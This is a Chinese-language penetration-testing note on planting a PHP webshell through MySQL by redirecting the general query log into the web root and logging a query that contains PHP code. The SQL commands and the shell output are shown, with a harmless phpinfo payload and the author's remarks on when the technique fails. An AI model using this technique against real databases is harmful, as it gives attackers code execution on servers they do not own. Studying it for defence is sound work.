利用写文件写shell。

利用日志写shell。

^
一般情况下 Linux 系统下面权限分配比较严格，MySQL 用户一般情况下是无法直接往站点根目录写入文件的，这种情况下在 Windows 环境下成功率会很高。
 利用日志写shell：
* Web 文件夹宽松权限可以写入
* Windows 系统下
* 高权限运行 MySQL 或者 Apache

MySQL 5.0 版本以上会创建日志文件，可以通过修改日志的全局变量来 getshell
```bash
mysql> SHOW VARIABLES LIKE 'general%';
+------------------+---------------------------------+
| Variable_name    | Value                           |
+------------------+---------------------------------+
| general_log      | OFF                             |
| general_log_file | /var/lib/mysql/c1595d3a029a.log |
+------------------+---------------------------------+
```
`general_log` 默认关闭，开启它可以记录用户输入的每条命令，会把其保存在对应的日志文件中。
可以尝试自定义日志文件，并向日志文件里面写入内容的话，那么就可以成功 getshell：
```bash
# 更改日志文件位置
set global general_log = "ON";
set global general_log_file='/var/www/html/info.php';

# 查看当前配置
mysql> SHOW VARIABLES LIKE 'general%';
+------------------+-----------------------------+
| Variable_name    | Value                       |
+------------------+-----------------------------+
| general_log      | ON                          |
| general_log_file | /var/www/html/info.php |
+------------------+-----------------------------+

# 往日志里面写入 payload
select '<?php phpinfo();?>';

# 此时已经写到 info.php 文件当中了
root@c1595d3a029a:/var/www/html/$ cat info.php 
/usr/sbin/mysqld, Version: 5.5.61-0ubuntu0.14.04.1 ((Ubuntu)). started with:
Tcp port: 3306  Unix socket: /var/run/mysqld/mysqld.sock
Time                 Id Command    Argument
201031 21:14:46       40 Query    SHOW VARIABLES LIKE 'general%'
201031 21:15:34       40 Query    select '<?php phpinfo();?>
```

这里虽然可以成功写入，但是这个 info.php 是 MySQL 创建的 ：

```
-rw-rw---- 1 mysql mysql 293 Oct 31 21:15 info.php
```
Apache 访问这个 php 文件会出现 HTTP 500 的状态码，结论是 root 系统这种情况基本上不会成功，只有在 Windows 系统下成功率会高一些，不过这里还是可以当做小知识点来学习记录。
那么能不能利用已经获取到的 MySQL 权限来执行系统主机的命令的呢？那就要使用MySQL 提权了。

